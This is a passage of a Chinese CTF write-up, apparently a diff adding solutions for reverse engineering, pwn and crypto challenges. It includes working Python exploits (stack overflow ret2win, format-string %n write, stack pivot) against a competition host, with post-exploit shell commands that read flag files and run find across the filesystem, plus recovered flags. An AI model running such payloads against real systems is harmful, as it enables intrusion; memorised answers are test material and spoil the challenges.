+        db 0x74, 0x71, 0x6D, 0x66, 0x72, 0x6E, 0x63, 0x17, 0x0C, 0x78, 0x6F, 0x6A
+        db 0x7D, 0x45, 0x53, 0x35, 0x40, 0x56, 0x40, 0x5C, 0x59, 0x51, 0x5F, 0x51
+        db 0x3C, 0x6D, 0x29, 0x37, 0x2A, 0x27, 0x2E, 0x46, 0x2D, 0x23, 0x33, 0x38
+        db 0x38, 0x38, 0x47, 0x43, 0x45, 0x5F, 0x43, 0x48, 0x44, 0x3E, 0x2C, 0x3C
+
+    pop     bx
+    pop     cx
+    pop     dx
+    xchg    ax, dx
+    xchg    bx, cx
+    add     ax, 0x1111
+    sub     bx, 0x2222
+    xor     cx, 0x3333
+    and     dx, 0x0F0F
+    push    ax
+    push    bx
+    mov     ax, 0x0000
+    mov     bx, 0x0000
+    pop     bx
+    pop     ax
+    xor     ax, ax
+    xor     bx, bx
+    xor     cx, cx
+    xor     dx, dx
+
+off_01CE:
+        db 0x62, 0x44, 0x52, 0x45, 0x17, 0x76, 0x54, 0x54
+        db 0x52, 0x44, 0x44, 0x17, 0x7B, 0x52, 0x41, 0x52
+        db 0x5B, 0x0D, 0x17, 0x64, 0x6E, 0x64, 0x63, 0x72
+        db 0x7A, 0x37, 0x72, 0x59, 0x43, 0x52, 0x45, 0x17
+        db 0x67, 0x56, 0x44, 0x44, 0x40, 0x58, 0x45, 0x53
+    jmp     .skip_msg
+        db 0x0D, 0x17, 0x37
+.skip_msg:
+
+off_01FD:
+    mov     cx, 0x0020
+    mov     si, off_01CE
+.xor_loop:
+    lodsb
+    xor     al, cl
+    stosb
+    loop    .xor_loop
+    xor     si, si
+    xor     di, di
+    xor     cx, cx
+    jmp     .skip_dead
+    mov     ax, 0xB800
+    mov     es, ax
+    xor     di, di
+    mov     cx, 0x07D0
+    rep     stosw
+.skip_dead:
+
+off_0221:
+    times 6 db 0x7A, 0x6D, 0xA7, 0x37, 0x34, 0x37, 0x37, 0x37
+
+off_0251:
+    times 6 db 0x19, 0x24, 0x00, 0x75, 0x62, 0x51, 0x3D, 0x37, 0xC8
+
+off_0287:
+    times 6 db 0x24, 0x00, 0x75, 0x62, 0x51, 0xE9, 0x9A, 0x89, 0xD8, 0xFD, 0xC9, 0x8D
+
+off_02CF:
+    times 14 db 0x04, 0x0D, 0x01, 0x08, 0x15, 0x55, 0x5C, 0x53, 0x5C, 0x36
+
+off_035B:
+        db 0x76, 0x54, 0x54, 0x52, 0x44, 0x44, 0x17, 0x70
+        db 0x45, 0x56, 0x59, 0x43, 0x52, 0x53, 0x19, 0x17
+        db 0x60, 0x52, 0x5B, 0x54, 0x58, 0x5A, 0x52, 0x1B
+        db 0x17, 0x76, 0x53, 0x5A, 0x5E, 0x59, 0x5E, 0x44
+        db 0x43, 0x45, 0x56, 0x43, 0x58, 0x45, 0x16, 0x37
+
+off_0383:
+    mov     ah, 0x0E
+    mov     al, '>'
+    int     0x10
+    mov     al, ' '
+    int     0x10
+    mov     si, off_017B
+    mov     cx, 0x0010
+.type:
+    lodsb
+    int     0x10
+    push    cx
+    mov     cx, 0x0040
+.wait:
+    loop    .wait
+    pop     cx
+    loop    .type
+    xor     cx, cx
+    xor     ax, ax
+    xor     si, si
+
+off_03A9:
+    mov     ax, 0xDEAD
+    mov     bx, 0xBABE
+    mul     bx
+    rcl     ax, 1
+    xor     ax, 0xFFFF
+    xor     ax, ax
+    xor     bx, bx
+
+off_03BA:
+    times 8 db 0xDF, 0x34, 0x37, 0xDC, 0x36, 0xA7
+
+off_03EA:
+    mov     si, off_0221
+    mov     cx, 0x0030
+    mov     dx, 0xFFFF
+.crc:
+    lodsb
+    xor     dh, al
+    mov     bx, 0x0008
+.bit:
+    shr     dx, 1
+    jnc     .noxy
+    xor     dx, 0xA001
+.noxy:
+    dec     bx
+    jnz     .bit
+    loop    .crc
+    cmp     dx, 0x1D0F
+    je      .ok
+    mov     ax, 0x0001
+    jmp     .done_crc
+.ok:
+    xor     ax, ax
+.done_crc:
+    xor     si, si
+    xor     cx, cx
+    xor     dx, dx
+    xor     bx, bx
+
+off_0424:
+        db 0x7E, 0x79, 0x61, 0x76, 0x7B, 0x7E, 0x73, 0x17, 0x67, 0x76, 0x64, 0x64
+        db 0x60, 0x78, 0x65, 0x73
+        db 0x76, 0x74, 0x74, 0x72, 0x64, 0x64, 0x17, 0x73, 0x72, 0x79, 0x7E, 0x72
+        db 0x73
+        db 0x64, 0x6E, 0x64, 0x63, 0x72, 0x7A, 0x17, 0x7F, 0x76, 0x7B, 0x63, 0x72
+        db 0x73
+        db 0x74, 0x7F, 0x72, 0x74, 0x7C, 0x64, 0x62, 0x7A, 0x17, 0x71, 0x76, 0x7E
+        db 0x7B, 0x62, 0x65, 0x72
+        db 0x73, 0x72, 0x74, 0x65, 0x6E, 0x67, 0x63, 0x7E, 0x78, 0x79, 0x17, 0x72
+        db 0x65, 0x65, 0x78, 0x65
+        db 0x64, 0x72, 0x70, 0x7A, 0x72, 0x79, 0x63, 0x17, 0x71, 0x76, 0x62, 0x7B
+        db 0x63
+
+off_047B:
+    times 24 db 0xA7
+
+off_0493:
+    times 8 db 0x24, 0x00, 0x75, 0x62, 0x51, 0x40, 0xBF, 0xAE, 0x9D, 0x8C, 0xFB, 0xEA, 0xD9, 0xC8, 0x37, 0x26
+
+off_0513:
+    times 40 db 0xDC, 0xC9
+
+off_0563:
+        db 0x63, 0x7F, 0x7E, 0x64, 0x17, 0x7E, 0x64, 0x17, 0x76, 0x17, 0x73, 0x72
+        db 0x74, 0x78, 0x6E, 0x17, 0x1A, 0x17, 0x63, 0x7F, 0x72, 0x17, 0x71, 0x7B
+        db 0x76, 0x70, 0x17, 0x7E, 0x64, 0x17, 0x72, 0x7B, 0x64, 0x72, 0x60, 0x7F
+        db 0x72, 0x65, 0x72, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
+        db 0x79, 0x78, 0x63, 0x7F, 0x7E, 0x79, 0x70, 0x17, 0x63, 0x78, 0x17, 0x64
+        db 0x72, 0x72, 0x17, 0x7F, 0x72, 0x65, 0x72, 0x17, 0x1A, 0x17, 0x7A, 0x78
+        db 0x61, 0x72, 0x17, 0x76, 0x7B, 0x78, 0x79, 0x70, 0x17, 0x17, 0x17, 0x17
+        db 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
+        db 0x7C, 0x72, 0x72, 0x67, 0x17, 0x73, 0x7E, 0x70, 0x70, 0x7E, 0x79, 0x70
+        db 0x17, 0x6E, 0x78, 0x62, 0x17, 0x76, 0x65, 0x72, 0x17, 0x74, 0x7B, 0x78
+        db 0x64, 0x72, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
+        db 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17
+
+off_05EF:
+        db 0x73, 0x72, 0x74, 0x78, 0x6E, 0x68, 0x64, 0x63, 0x65, 0x7E, 0x79, 0x70
+        db 0x68, 0x06, 0x05, 0x04, 0x03, 0x02, 0x68
+
+off_063B:
+    mov     si, off_06AB
+    mov     di, off_06CF
+    mov     cx, flag_len
+
+    push    bx
+    push    ax
+    pop     bx
+    pop     ax
+    xchg    ax, bx
+
+.decode_loop:
+    lodsb
+
+    push    ax
+    pop     ax
+
+    xor     al, bl
+    stosb
+
+    inc     bl
+
+    cmp     ax, 0
+    lahf
+    sahf
+
+    loop    .decode_loop
+
+    mov     si, off_06CF
+    mov     cx, flag_real_len
+    xor     al, al
+
+.verify_loop:
+    xor     al, [si]
+    inc     si
+    loop    .verify_loop
+
+    cmp     al, [si]
+    je      .valid
+
+    mov     ah, 0x09
+    mov     dx, off_0688
+    int     0x21
+    jmp     .exit
+
+.valid:
+    mov     byte [off_06CF + flag_real_len], '$'
+    mov     ah, 0x09
+    mov     dx, off_06CF
+    int     0x21
+
+    mov     ah, 0x01
+    int     0x21
+
+.exit:
+    int     0x20
+
+off_0688:
+        db 0x76, 0x74, 0x74, 0x72, 0x64, 0x64, 0x17, 0x73, 0x72, 0x79, 0x7E, 0x72
+        db 0x73, 0x17, 0x1A, 0x17, 0x7E, 0x79, 0x61, 0x76, 0x7B, 0x7E, 0x73, 0x17
+        db 0x74, 0x7F, 0x72, 0x74, 0x7C, 0x64, 0x62, 0x7A, 0x3A, 0x3D, 0x13
+
+off_06AB:
+    db  0x33
+    db  0x3A
+    db  0x36
+    db  0x3F
+    db  0x22
+    db  0x62
+    db  0x6B
+    db  0x64
+    db  0x6B
+    db  0x01
+    db  0x2D
+    db  0x53
+    db  0x17
+    db  0x07
+    db  0x11
+    db  0x51
+    db  0x00
+    db  0x39
+    db  0x56
+    db  0x5D
+    db  0x36
+    db  0x0B
+    db  0x34
+    db  0x0E
+    db  0x2D
+    db  0x1D
+    db  0x5E
+    db  0x13
+    db  0x2E
+    db  0x01
+    db  0x18
+    db  0x45
+    db  0x19
+    db  0x1A
+    db  0x0A
+    db  0x14
+
+flag_len equ $ - off_06AB
+flag_real_len equ 35
+
+off_06CF:
+    times 64 db 0x90
+
+off_070F:
+        db 0x1A, 0x1A, 0x1A, 0x75, 0x72, 0x70, 0x7E, 0x79, 0x17, 0x71, 0x76, 0x62
+        db 0x6F, 0x17, 0x64, 0x63, 0x65, 0x62, 0x74, 0x63, 0x62, 0x65, 0x72, 0x64
+        db 0x1A, 0x1A, 0x1A
+        db 0x62, 0xBC, 0xDB, 0xB4, 0xDB, 0x27, 0x64, 0x61, 0x60, 0xBC, 0xC6
+        db 0x7A, 0x6D, 0x7F, 0x72, 0x76, 0x73, 0x72, 0x65
+    times 10 db 0x37
+        db 0x7A, 0x6D, 0xA7, 0x37, 0x34, 0x37, 0x37, 0x37
+
+    times 64 db 0x7A
+    times 48 db 0xA7
+    times 48 db 0x37
+    times 48 db 0x17
+    times 48 db 0x24
+    times 48 db 0x00
+    times 48 db 0x75
+    times 48 db 0x6D
+
+        db 0x1A, 0x1A, 0x1A, 0x72, 0x7A, 0x75, 0x72, 0x73, 0x73, 0x72, 0x73, 0x17
+        db 0x7B, 0x78, 0x70, 0x64, 0x1A, 0x1A, 0x1A, 0x3A, 0x3D
+        db 0x7B, 0x58, 0x56, 0x53, 0x7A, 0x58, 0x53, 0x42, 0x5B, 0x52, 0x0D, 0x17
+        db 0x54, 0x45, 0x4E, 0x47, 0x43, 0x58, 0x19, 0x53, 0x5B, 0x5B, 0x3A, 0x3D
+        db 0x7E, 0x59, 0x5E, 0x43, 0x64, 0x52, 0x46, 0x42, 0x52, 0x59, 0x54, 0x52
+        db 0x0D, 0x17, 0x78, 0x7C, 0x3A, 0x3D
+        db 0x62, 0x44, 0x52, 0x45, 0x0D, 0x17, 0x76, 0x73, 0x7A, 0x7E, 0x79, 0x3A
+        db 0x3D
+
+        db 0x1A, 0x1A, 0x1A, 0x72, 0x79, 0x73, 0x17, 0x71, 0x76, 0x7C, 0x72, 0x17
+        db 0x73, 0x76, 0x63, 0x76, 0x1A, 0x1A, 0x1A
+```
+
+跟着AI的思路：
+
+程序类别：
+```
+BITS 16
+ORG 100h
+```
+这是一个16位DOS.com程序
+
+.com程序默认加载到CS:0100h开始执行
+
+```
+off_0100:
+    push    cs
+    pop     ds
+    push    cs
+    pop     es
+```
+这里应该是~栈初始化~
+
+问了AI后，得知：
+```
+意思是把代码段 CS 赋给数据段 DS 和附加段 ES。因为 .COM 文件通常代码和数据都在同一个段里，所以这样做之后，程序访问 off_xxxx 数据时就能正常读写。这个是判断它“真正在初始化运行环境”的一个信号。
+```
+
+然后有一段较长但是不知所以得代码
+```
+mov     ax, 0x1337
+mov     bx, 0x0DEF
+mov     cx, 0xBEEF
+mov     dx, 0xC0DE
+mul     cx
+add     ax, bx
+ror     ax, 4
+xor     ah, 0xAB
+xor     ax, ax
+xor     bx, bx
+xor     cx, cx
+xor     dx, dx
+```
+最后都跟自己异或了，归0了，应该是来混淆的
+
+再到：
+```
+    mov     al, 0x37
+
+    xchg    ax, cx
+    xchg    ax, cx
+
+    add     al, 0x13
+
+    cmp     bx, 0
+    je      .L1
+    mov     al, 0xFF
+```
+
+意思是：
+```
+al = 0x37
+al = al + 0x13 = 0x4A
+al = al ^ 0x1F = 0x55
+bl = al = 0x55
+然后跳转函数 off_063B
+```
+
+函数 off_063B:
+```
+off_063B:
+    mov     si, off_06AB
+    mov     di, off_06CF
+    mov     cx, flag_len
+
+    push    bx
+    push    ax
+    pop     bx
+    pop     ax
+    xchg    ax, bx
+
+.decode_loop:
+    lodsb
+
+    push    ax
+    pop     ax
+
+    xor     al, bl
+    stosb
+
+    inc     bl
+
+    cmp     ax, 0
+    lahf
+    sahf
+
+    loop    .decode_loop
+
+    mov     si, off_06CF
+    mov     cx, flag_real_len
+    xor     al, al
+
+.verify_loop:
+    xor     al, [si]
+    inc     si
+    loop    .verify_loop
+
+    cmp     al, [si]
+    je      .valid
+
+    mov     ah, 0x09
+    mov     dx, off_0688
+    int     0x21
+    jmp     .exit
+
+.valid:
+    mov     byte [off_06CF + flag_real_len], '$'
+    mov     ah, 0x09
+    mov     dx, off_06CF
+    int     0x21
+
+    mov     ah, 0x01
+    int     0x21
+
+.exit:
+    int     0x20
+```
+
+开头三行代码暴露了数据：
+```
+SI = 源数据地址 ==> off_06AB 密文区
+DI = 目标缓冲区地址 ==> off_06CF 解密输出缓冲区
+CX = 循环次数 ==> flag_len 解密长度
+```
+
+密文：
+```
+off_06AB:
+    db  0x33
+    db  0x3A
+    db  0x36
+    db  0x3F
+    db  0x22
+    db  0x62
+    db  0x6B
+    db  0x64
+    db  0x6B
+    db  0x01
+    db  0x2D
+    db  0x53
+    db  0x17
+    db  0x07
+    db  0x11
+    db  0x51
+    db  0x00
+    db  0x39
+    db  0x56
+    db  0x5D
+    db  0x36
+    db  0x0B
+    db  0x34
+    db  0x0E
+    db  0x2D
+    db  0x1D
+    db  0x5E
+    db  0x13
+    db  0x2E
+    db  0x01
+    db  0x18
+    db  0x45
+    db  0x19
+    db  0x1A
+    db  0x0A
+    db  0x14
+```
+
+然后需要找解密的方法：
+```
+.decode_loop:
+    lodsb           // mov al, [si] 从DS:SI指向的位置读取1字节到AL
+                    // inc si       SI++
+
+    push    ax
+    pop     ax
+
+    xor     al, bl  // AL = AL ^ BL
+                    // 如：明文[0] = 密文[0] ^ 0x55 ==> 0x33 ^ 0x55 = 0x66 = 'f'
+    stosb           // mov [di], al 将AL写到ES:DI的位置
+                    // inc di    DI++
+                    // 解密的结果会放入 off_06CF
+    inc     bl      // 每解一个字节,key++
+
+    cmp     ax, 0
+    lahf
+    sahf
+
+    loop    .decode_loop
+```
+
+
+Python代码：
+```
+enc = [
+    0x33, 0x3A, 0x36, 0x3F, 0x22, 0x62, 0x6B, 0x64,
+    0x6B, 0x01, 0x2D, 0x53, 0x17, 0x07, 0x11, 0x51,
+    0x00, 0x39, 0x56, 0x5D, 0x36, 0x0B, 0x34, 0x0E,
+    0x2D, 0x1D, 0x5E, 0x13, 0x2E, 0x01, 0x18, 0x45,
+    0x19, 0x1A, 0x0A, 0x14
+]
+
+key = 0x55
+out = []
+
+for b in enc:
+    out.append(b ^ key)
+    key = (key + 1) & 0xff
+
+print(bytes(out))
+print(bytes(out[:35]).decode())
+```
+
+flag
+```
+flag{8086_r3ver5e_15_a_b@s1c_sk1ll}
+```
+
+
+
+
+
+### nyah
+
+查看主逻辑函数：
+
+![主逻辑函数](./reverse/nyah/主逻辑函数.png)
+
+每一个函数及其操作我写在了注释中
+
+这里是两个比较重要的函数：
+
+一个洗牌函数：
+![洗牌函数](./reverse/nyah/洗牌函数.png)
+
+一个加密函数：
+![加密](./reverse/nyah/加密.png)
+
+整个加密流程可以概括为：
+```
+程序先生成了一个表v5(我命名为table了)，并使用delta_time对table洗牌
+
+然后函数sub_1400015FD会将密文串和table做异或加密。
+```
+
+再根据delta_time应该为259200,便有了以下解密脚本：
+```python
+cipher = bytes.fromhex(
+    "61 6e 64 cd 7f 68 c1 e6"
+    "3f a3 9d f9 7c 3f c6 a1"
+    "ec db 7b 2f 7e 7f 69 29"
+    "ee 9f be 54 6e 69 60 12"
+)
+
+def shuffle_table(seed):
+    s = list(range(256))
+
+    for i in range(0, 256, 8):
+        v5 = 0
+
+        for j in range(8):
+            v5 = (v5 << 8) + s[i + j]
+
+        seed ^= v5
+        seed &= 0xffffffffffffffff
+
+        for k in range(8):
+            v4 = (seed >> (8 * k)) & 0xff
+            s[i + k], s[v4] = s[v4], s[i + k]
+
+    return s
+
+seed = 259200
+s = shuffle_table(seed)
+
+plain = bytes(c ^ s[i] for i, c in enumerate(cipher))
+print(plain)
+print(plain.rstrip(b"\x00").decode())
+```
+
+flag:
+![flag](./reverse/nyah/flag.png)
+
+## Pwm
+
+### ezstack
+
+使用 IDA 打开程序，Shift + F12 搜字符串套转到主逻辑函数部分：
+
+![函数主逻辑部分](./pwm/ezstack/ida_main.png)
+
+这里看到ReadingBuffer的大小只有112，没有做防溢出保护
+
+然后程序为64位程序
+
+![64位程序](./pwm/ezstack/64.png)
+
+所以只要这样构造一个这样的栈布局就可以实现入侵：
+
+<padding expand="16">
+
+![evil的地址](/assets/local-svg/ezstack.drawio.p16.svg)
+
+</padding>
+
+即通过写入112个A字符写到[rbp+0]的位置，然后在[rbp+8]的位置放入一个任意地址的retn指令实现linux 64位程序所需要的16位对齐，再在[rbp+16]的位置放入evil函数的地址即可完成栈溢出攻击。
+
+再查询evil的地址：
+
+![evil的地址](./pwm/ezstack/400507.png)
+
+于是有了以下代码：
+```python
+import socket
+import struct
+import time
+
+HOST = "ctf-2.xeed.run"
+PORT = 30832
+
+def p64(x):
+    return struct.pack("<Q", x)
+
+ret = 0x400506
+evil = 0x400507
+
+payload = b"A" * 120
+payload += p64(ret)
+payload += p64(evil)
+
+s = socket.create_connection((HOST, PORT))
+s.settimeout(2)
+
+# 接收题目提示
+try:
+    data = s.recv(4096)
+    print(data.decode(errors="ignore"), end="")
+except:
+    pass
+
+# 发送溢出 payload
+s.sendall(payload + b"\n")
+
+time.sleep(0.2)
+
+# 给 shell 发命令
+cmds = [
+    b"id\n",
+    b"pwd\n",
+    b"ls -la\n",
+    b"cat flag 2>/dev/null\n",
+    b"cat flag.txt 2>/dev/null\n",
+    b"cat /flag 2>/dev/null\n",
+    b"cat /flag.txt 2>/dev/null\n",
+    b"find / -name '*flag*' 2>/dev/null\n",
+]
+
+for cmd in cmds:
+    s.sendall(cmd)
+    time.sleep(0.1)
+
+# 持续接收输出
+while True:
+    try:
+        data = s.recv(4096)
+        if not data:
+            break
+        print(data.decode(errors="ignore"), end="")
+    except socket.timeout:
+        break
+```
+
+flag截图：
+
+![flag](./pwm/ezstack/ezstack_flag.png)
+
+
+### ezstring
+
+本题的漏洞是格式化字符串漏洞
+
+![flag](./pwm/ezstring/main.png)
+
+思路就是：只要合理的控制字符串的输出，就可以利用%n对check修改数据，实现进入win函数的目的。
+
+题目给的值是 0xdeadbeef,由于一次性输出0xdeedbeef的字符过大
+可以分两段输入给check ==> 0xdead 0xbeef
+
+因为程序是小端序，所以低位在低地址，高位在高地址，因此需要：
+
+[check + 0] 写入 0xbeef
+[check + 2] 写入 0xdead
+
+这里附上check的地址
+![check的地址](./pwm/ezstring/check地址.png)
+
+```text
+第一段
+%1$0xbeefc ==> %1$48879c
+第二段
+%1$(0xdead-0xbeef)c ==> %1$(57005-48879)c ==> %1$8126c
+结合在一起就是
+%1$48879c%1$8126c
+```
+
+此时还需要伪造参数并写入数据
+
+即：
+```
+%1$48879c + {%参数1的位置$hn} + %1$8126c + {%参数2的位置$hn}
+```
+
+这里还需定位printf参数的位置。一般字符串不长，估计参数也就两位数，先不如写成：
+```
+%1$48879c + {%xx$hn} + %1$8126c + {%xx的位置$hn}
+
+%1$48879c%xx$hn%1$8126c%xx$hn
+```
+共计29字节，
+
+在 64 位 Linux 程序中，前几个参数会优先通过寄存器传递，而本题测试发现，buf + 0x00 对应 printf 的第 6 个参数。由于 64 位地址占 8 字节，因此后续每 8 字节对应一个参数位置：
+
+```
+buf + 0x00	→	第 6 个参数
+buf + 0x08	→	第 7 个参数
+buf + 0x10	→	第 8 个参数
+buf + 0x18	→	第 9 个参数
+buf + 0x20	→	第 10 个参数
+buf + 0x28	→	第 11 个参数
+```
+
+于是向上补齐到32字节，此时[buf + 0]to[buf + 31] 为格式化字符串，占用了参数6到参数9的位置
+
+那么只需再加两个参数10,11用于存放[check + 0]和[check + 2]的地址
+
+于是得到
+```
+%1$48879c%10$hn%1$8126c%11$hnAAA + p64(0x4040cc) + p64(0x4040ce)
+```
+
+所以有了以下代码：
+```python
+import socket
+import struct
+import re
+
+HOST = "ctf-2.xeed.run"
+PORT = 31756
+
+def p64(x):
+    return struct.pack("<Q", x)
+
+check = 0x4040cc
+
+fmt = b"%1$48879c%10$hn%1$8126c%11$hn"
+
+payload = fmt
+payload += b"A" * (32 - len(payload))
+payload += p64(check)
+payload += p64(check + 2)
+
+print("[+] payload length:", len(payload))
+
+s = socket.create_connection((HOST, PORT), timeout=8)
+
+banner = s.recv(4096)
+print(banner.decode(errors="ignore"))
+
+s.sendall(payload + b"\n")
+
+data = b""
+s.settimeout(5)
+
+while True:
+    try:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        data += chunk
+    except socket.timeout:
+        break
+
+m = re.search(rb"(flag\{[^}]+\}|A1CTF\{[^}]+\})", data)
+if m:
+    print("[+] FLAG:", m.group(1).decode())
+else:
+    print(data[-3000:].decode(errors="ignore"))
+```
+
+flag:
+![flag](./pwm/ezstring/flag.png)
+
+
+### baseh
+
+本题的思路：
+
+这里是主逻辑函数：
+
+![主逻辑函数](./pwm/baseh/main.png)
+
+这里粗略看了一下输入，没发现问题，然后绕了一圈定位到了auth函数
+
+![auth函数](./pwm/baseh/bug.png)
+
+这里发现auth函数中局部变量v4有漏洞：
+
+![漏洞原理](./pwm/baseh/baseh.svg)
+
+于是可以通过修改auth函数要返回的ebp，让auth函数返回时，ebp跳转到input的地址上。
+
+然后在input上构造这样的假栈：
+
+![input上的假栈](./pwm/baseh/baseh_input.drawio.svg)
+
+即可让程序在main执行ret后，让esp指向input假栈中的correct地址，从而让eip跳转correct，即执行correct函数
+
+代码：
+```python
+import socket
+import struct
+import base64
+import time
+
+HOST = "ctf-2.xeed.run"
+PORT = 31679
+
+def p32(x):
+    return struct.pack("<I", x)
+
+correct = 0x0804925f
+bss_buf = 0x0811eb40
+
+raw = p32(0xdeadbeef)
+raw += p32(correct)
+raw += p32(bss_buf)
+
+payload = base64.b64encode(raw)
+
+print("[+] raw payload:", raw.hex())
+print("[+] base64 payload:", payload.decode())
+
+s = socket.create_connection((HOST, PORT), timeout=8)
+
+data = s.recv(4096)
+print(data.decode(errors="ignore"))
+
+s.sendall(payload + b"\n")
+
+time.sleep(0.5)
+
+# 拿到 shell 后尝试读 flag
+s.sendall(b"cat /flag 2>/dev/null; cat flag* 2>/dev/null\n")
+
+time.sleep(0.5)
+
+try:
+    while True:
+        data = s.recv(4094096)
+        if not data:
+            break
+        print(data.decode(errors="ignore"), end="")
+except:
+    pass
+```
+
+![flag](./pwm/baseh/flag.png)
+
+### nopnopnop
+
+这一题也是栈溢出，程序会输出Target,解析后向Buffer输入字符覆盖返回地址跳转即可，代码如下：
+
+代码：
+```python
+import socket
+import struct
+import re
+import time
+
+HOST = "ctf-2.xeed.run"
+PORT = 30087
+
+offset = 0x108
+
+def recv_until(s, mark=b">"):
+    data = b""
+    while mark not in data:
+        chunk = s.recv(1)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+s = socket.create_connection((HOST, PORT), timeout=10)
+s.settimeout(8)
+s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+banner = recv_until(s, b">")
+print(banner.decode(errors="ignore"), end="")
+
+m = re.search(rb"Target:\s*(0x[0-9a-fA-F]+)", banner)
+if not m:
+    print("\n[-] 没找到 Target")
+    exit()
+
+target = int(m.group(1), 16)
+ret_gadget = target - 1   # 0x40127a: ret
+
+print(f"\n[+] target     = {hex(target)}")
+print(f"[+] ret gadget = {hex(ret_gadget)}")
+
+payload = b"A" * offset
+payload += struct.pack("<Q", ret_gadget)
+payload += struct.pack("<Q", target)
+payload += b"\n"
+
+print(f"[+] payload length = {len(payload)}")
+print("[+] sending aligned ret2win payload...")
+
+s.sendall(payload)
+
+# 不要 shutdown
+time.sleep(0.5)
+
+out = b""
+while True:
+    try:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        out += chunk
+    except socket.timeout:
+        break
+
+print(out.decode(errors="ignore"), end="")
+s.close()
+```
+
+![flag](./pwm/nopnopnop/flag.png)
+
+
+
+## Crypto
+
+### BAGUA
 
 题目引言：
 ```
@@ -311,7 +2210,315 @@ flag{B1n4ry_B4gua_L3ibn1z_1687}
 
 ---
 
-## Hidden Secret
+### dlp
+
+题目:
+```python
+from Crypto.Util.number import *
+import math
+
+
+m = bytes_to_long(flag)
+n = 12658496303201581987904413378231672705848324463557650748242993254944407255926163828010653564020917857620982783176641954529909922267412737349457807433073478956716588664201001
+print(pow(7,m,n))
+
+'''
+965034179468698868811585108402708910494957686334522514089846951965123540637986716168374511689067098771159300199946023700677529514020404560754430727137920456537319123516664
+'''
+```
+
+~不会做，扔给ai，啊，看题解吓哭了:~
+
+~ChatGPT:~
+
+~注意到n的特殊性：~
+
+~n = p^5 * q~
+
+~其中：~
+
+~p = 10532208912748542707~
+
+~q = 97675309052127525561124163779796696566431155872900589821544185613370103125443~
+
+~不是哥们儿......~
+
+还是稍微学一点吧：
+
+题目最终目的就是解出m的值，这是一个离散数对问题
+
+AI指出，先检查n是否为素数，如果是，就看n-1的分解，然后使用Pohlig-Hellman
+
+但是这里发现n是合数，使用factorint(n)后为 
+
+n = p^5 * q
+
+其中：
+
+p = 10532208912748542707
+
+q = 97675309052127525561124163779796696566431155872900589821544185613370103125443
+
+好吧，这次来源正常一点了。
+
+于是题目可以拆解为
+
+```
+(1) 7^m ≡ c mod p^5
+(2) 7^m ≡ c mod q
+```
+
+对于 (2):
+
+factorint(q - 1)可以分界处很多较小的因子
+
+于是有：
+
+```
+xq = discrete_log(q, c % q, 7)
+m ≡ xq mod q - 1
+```
+
+对于 (1):
+
+使用 p-adic log:
+```
+先求：
+7^x0 ≡ c mod p
+
+再设：
+m = x0 + (p - 1)t
+```
+
+之后对(1),(2)使用CRT合并，再进行解码得到结果：
+
+脚本：
+```
+import sympy as sp
+from math import lcm
+from sympy.ntheory.modular import crt
+
+n = 12658496303201581987904413378231672705848324463557650748242993254944407255926163828010653564020917857620982783176641954529909922267412737349457807433073478956716588664201001
+
+c = 965034179468698868811585108402708910494957686334522514089846951965123540637986716168374511689067098771159300199946023700677529514020404560754430727137920456537319123516664
+
+g = 7
+
+p = 10532208912748542707
+q = 97675309052127525561124163779796696566431155872900589821544185613370103125443
+
+assert n == p**5 * q
+
+
+def padic_log_1p(u, p, e):
+    """
+    计算 log(u) mod p^e
+    要求 u ≡ 1 mod p
+    """
+    mod = p ** e
+    z = (u - 1) % mod
+
+    s = 0
+    term = 1
+
+    for k in range(1, e):
+        term = (term * z) % mod
+        val = term * pow(k, -1, mod)
+
+        if k & 1:
+            s = (s + val) % mod
+        else:
+            s = (s - val) % mod
+
+    return s % mod
+
+
+# -----------------------------
+# 1. 解 mod p^5
+# -----------------------------
+
+modp5 = p ** 5
+
+# 先在 mod p 下求 x0
+x0 = sp.discrete_log(p, c % p, g % p)
+
+# 设 m = x0 + (p - 1)t
+a = pow(g, p - 1, modp5)
+b = (c % modp5) * pow(pow(g, x0, modp5), -1, modp5) % modp5
+
+# a^t ≡ b mod p^5
+# 取 p-adic log
+La = padic_log_1p(a, p, 5)
+Lb = padic_log_1p(b, p, 5)
+
+# La 和 Lb 都能被 p 整除，所以除掉一个 p
+t = ((Lb // p) * pow(La // p, -1, p ** 4)) % (p ** 4)
+
+xp = x0 + (p - 1) * t
+ord_p5 = sp.n_order(g, modp5)
+
+assert pow(g, xp, modp5) == c % modp5
+
+
+# -----------------------------
+# 2. 解 mod q
+# -----------------------------
+
+xq = sp.discrete_log(q, c % q, g % q)
+ord_q = sp.n_order(g, q)
+
+assert pow(g, xq, q) == c % q
+
+
+# -----------------------------
+# 3. CRT 合并
+# -----------------------------
+
+m, mod = crt([ord_p5, ord_q], [xp, xq])
+m = int(m)
+
+assert pow(g, m, n) == c
+
+flag = m.to_bytes((m.bit_length() + 7) // 8, "big")
+print(flag)
+```
+
+### double_crypto
+
+题目：
+```python
+#caesar_13_iv
+import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes
+import random
+
+script_dir = os.path.dirname(os.path.abspath(__file__))
+output_path = os.path.join(script_dir, "encrypted_params.txt")
+
+p = getPrime(128)
+q = getPrime(128)
+n = p * q
+e = 65537
+phi = (p - 1) * (q - 1)
+d = pow(e, -1, phi)
+
+print(f"[RSA] n = {n}")
+print(f"[RSA] e = {e}")
+
+m = bytes_to_long(flag)
+c_rsa = pow(m, e, n)
+print(f"[RSA] c_rsa = {c_rsa}")
+
+c_rsa_bytes = long_to_bytes(c_rsa, (n.bit_length() + 7) // 8)
+aes_key = random.randbytes(16)
+iv = random.randbytes(16)
+cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
+padded_data = pad(c_rsa_bytes, AES.block_size)
+c_aes = cipher_aes.encrypt(padded_data)
+
+print(f"[AES] key = {aes_key.hex()}")
+print(f"[AES] iv  = {iv.hex()}")
+print(f"[AES] ct  = {c_aes.hex()}")
+
+# n = 108460347539116548233850259329362939266582518558734624388997849930646568128401
